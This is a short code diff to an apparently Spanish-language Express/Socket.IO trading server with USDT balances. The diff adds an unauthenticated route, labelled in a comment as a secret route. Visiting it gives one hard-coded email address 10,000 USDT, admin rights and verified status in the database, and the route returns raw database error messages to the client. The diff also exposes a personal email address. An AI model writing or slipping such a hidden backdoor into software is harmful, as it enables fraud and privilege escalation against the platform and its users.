@@ -141,6 +141,16 @@ io.on('connection', (socket) => {
         io.to("orden_" + data.ordenId).emit('notificar_mensaje', { de: data.user });
     });
 });
+// RUTA SECRETA PARA ACTIVAR ADMIN Y SALDO
+app.get('/admin-power-up', async (req, res) => {
+    try {
+        const miEmail = 'alonzolaramiguelangel@gmail.com'; 
+        await pool.query('UPDATE usuarios SET saldo_usdt = 10000, is_admin = true, verificado = true WHERE email = $1', [miEmail]);
+        res.send(`<h1>✅ ¡Éxito! El usuario ${miEmail} ahora tiene 10,000 USDT y es Admin.</h1>`);
+    } catch (err) {
+        res.status(500).send("Error en la base de datos: " + err.message);
+    }
+});
 
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, '0.0.0.0', () => {
